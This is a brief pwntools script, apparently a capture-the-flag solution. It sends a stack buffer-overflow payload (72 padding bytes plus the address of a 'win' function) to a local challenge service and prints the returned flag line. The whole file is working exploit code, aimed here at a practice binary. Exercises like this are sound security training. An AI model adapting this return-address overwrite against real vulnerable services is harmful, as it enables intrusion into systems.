from pwn import *
import sys 
import warnings

warnings.filterwarnings(action='ignore', category=BytesWarning)

filename = "./bin/chal"

elf = ELF(filename)

context.binary = elf

#r = process(filename)
r = remote("127.0.0.1", 3003)
    
win = elf.sym["win"]
print("win @ " + hex(win))

# rop.call(win)

payload  = b"A" * 72
payload += p64(win)

r.sendline(payload)
print(r.recvline_contains(b"TSRY").decode())
